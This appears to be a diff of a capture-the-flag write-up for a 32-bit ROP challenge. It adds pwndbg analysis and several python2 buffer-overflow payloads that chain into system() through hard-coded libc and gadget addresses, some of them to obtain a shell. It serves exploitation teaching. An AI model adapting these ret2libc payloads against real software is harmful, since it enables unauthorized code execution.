@@ -1,5 +1,3 @@
-# CHANGE CHALLENGE TO RUNNING STR1, STR2, STR3 via SYSTEM FUNCTION
-
 ### How to compile binary (disable ASLR):
 
 `gcc roplevel2.c -o roplevel2 -fno-stack-protector -z execstack -m32 -no-pie -Wl,-z,norelro -mpreferred-stack-boundary=2`
@@ -85,33 +83,58 @@ warning: Unable to access 16000 bytes of target memory at 0xf7faa5ea, halting se
 
 Find gadgets to return to a System Function
 
-### Answer:
+### Answer for original version (I think?):
+
+Analysis things:
+
+```
+pwndbg>  x/s 0x804a024
+0x804a024:	"# this does nothing..."
+pwndbg> print &str1
+$10 = (<data variable, no debug info> *) 0x804b3f8 <str1>
+pwndbg> print &str2
+$11 = (<data variable, no debug info> *) 0x804b404 <str2>
+pwndbg> print &str3
+$12 = (<data variable, no debug info> *) 0x804b414 <str3>
+```
+
+Actual Exploit:
+
+```
+python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\xf8\xb3\x04\x08')" | ./roplevel2
+python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\x04\xb4\x04\x08')" | ./roplevel2
+python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\x14\xb4\x04\x08')" | ./roplevel2
+```
+
+### Answer for shell version:
 
 Using pure ret2libc:
 
 ```
-(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
+(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x80\x06\xdf\xf7\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
 
 Using gadget() function:
 
 ```
-(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xda\x91\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
+(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xda\x91\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
 
-Using `ROPGadget --binary ./roplevel2` (`0x080492c2 : sub al, 0x24 ; ret`):
+Using `ROPGadget --binary ./roplevel2-shellversion` (`0x080492c2 : sub al, 0x24 ; ret`):
 
 ```
-(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xc2\x92\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
+(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xc2\x92\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
 ```
 
 ### Notes:
 
 Based on the design of this challenge, the gadget function is not suitable to solve the puzzle as x86 stores parameters to functions on the stack while Mach-O stores parameters to functions in lower registers. I have since edited the challenge to allow it to be exploitable on a Linux OS via the gadget function or finding gadgets within the binary itself as well :). Due to the nature of this exploit, you can even just use a generic ret2libc attack.
 
-### References:
+You can try to obtain a root shell via a buffer overflow but on analysis of this challenge, it seems that the author wants us to execute the commands stored in str1, str2, str3 via gadget() and the winner() function call. From the author source code, I modified it and created 2 versions of the binary: One that aims to execute the commands store in str1, str2 and str3; and the other aims to obtan a shell.
 
-https://icyphox.sh/blog/rop-on-arm/
+Over [here](https://icyphox.sh/blog/rop-on-arm/) is a walkthrough of someone attempting the challenge and achieving code execution instead of executing the various commands stored in str1, str2, str3 as the author intended. Still a good read though.
+
+### References:
 
 https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP
 
